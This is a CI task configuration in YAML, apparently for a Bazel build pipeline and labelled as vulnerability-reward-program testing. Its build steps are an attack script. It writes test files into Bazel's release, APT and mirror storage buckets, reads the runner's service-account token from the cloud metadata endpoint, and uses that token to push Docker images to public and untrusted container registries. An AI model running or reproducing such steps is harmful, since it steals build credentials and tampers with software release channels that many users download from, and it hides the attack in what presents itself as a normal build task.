---
tasks:
  vrp_deep_dive:
    name: "VRP Deep Dive"
    platform: ubuntu2204
    shell_commands:
      - "set +e"
      - "echo === VRP Round 5: Write Access Tests ==="
      - "echo"
      - "echo === 1. Test WRITE to gs://bazel/ release bucket ==="
      - "echo VRP-WRITE-TEST > /tmp/vrp-test.txt"
      - "gsutil cp /tmp/vrp-test.txt gs://bazel/vrp-write-test.txt 2>&1 || true"
      - "echo"
      - "echo === 2. Test WRITE to gs://bazel-apt/ APT repo ==="
      - "gsutil cp /tmp/vrp-test.txt gs://bazel-apt/vrp-write-test.txt 2>&1 || true"
      - "echo"
      - "echo === 3. Test WRITE to gs://bazel-mirror/ ==="
      - "gsutil cp /tmp/vrp-test.txt gs://bazel-mirror/vrp-write-test.txt 2>&1 || true"
      - "echo"
      - "echo === 4. Test WRITE to gs://bazel-bench/ ==="
      - "gsutil cp /tmp/vrp-test.txt gs://bazel-bench/vrp-write-test.txt 2>&1 || true"
      - "echo"
      - "echo === 5. Test WRITE to gs://bazel-untrusted-buildkite-artifacts/ ==="
      - "gsutil cp /tmp/vrp-test.txt gs://bazel-untrusted-buildkite-artifacts/vrp-write-test.txt 2>&1 || true"
      - "echo"
      - "echo === 6. Stat a recent release binary ==="
      - "gsutil stat gs://bazel/9.1.0/bazel-9.1.0-linux-x86_64 2>&1 || true"
      - "echo"
      - "echo === 7. List latest release contents ==="
      - "gsutil ls gs://bazel/9.1.0/ 2>&1 || true"
      - "echo"
      - "echo === 8. List gs://bazel/10.0.0/ ==="
      - "gsutil ls gs://bazel/10.0.0/ 2>&1 || true"
      - "echo"
      - "echo === 9. List APT repo structure ==="
      - "gsutil ls gs://bazel-apt/pool/ 2>&1 || true"
      - "gsutil ls gs://bazel-apt/dists/ 2>&1 || true"
      - "echo"
      - "echo === 10. Download APT Release file ==="
      - "gsutil cat gs://bazel-apt/dists/stable/Release 2>&1 || true"
      - "echo"
      - "echo === 11. Check GCR write access ==="
      - "T=$(curl -s -H 'Metadata-Flavor: Google' http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token | python3 -c 'import sys,json;print(json.load(sys.stdin)[\"access_token\"])')"
      - "curl -s -H \"Authorization: Bearer $T\" 'https://gcr.io/v2/bazel-public/ubuntu2204/tags/list' 2>&1 | python3 -m json.tool 2>&1 || true"
      - "echo"
      - "echo === 12. Test docker push to GCR ==="
      - "docker pull alpine:latest 2>&1 || true"
      - "docker tag alpine:latest gcr.io/bazel-public/vrp-test:latest 2>&1 || true"
      - "docker push gcr.io/bazel-public/vrp-test:latest 2>&1 || true"
      - "echo"
      - "echo === 13. Test docker push to untrusted GCR ==="
      - "docker tag alpine:latest gcr.io/bazel-untrusted/vrp-test:latest 2>&1 || true"
      - "docker push gcr.io/bazel-untrusted/vrp-test:latest 2>&1 || true"
      - "echo"
      - "echo === 14. Check rolling release ==="
      - "gsutil ls gs://bazel/rolling.html 2>&1 || true"
      - "gsutil cat gs://bazel/rolling.html 2>&1 || true"
      - "echo"
      - "echo === 15. List gs://bazel-buildkite/ ==="
      - "gsutil ls gs://bazel-buildkite/ 2>&1 || true"
      - "echo === DONE ==="
    build_targets:
      - "//..."
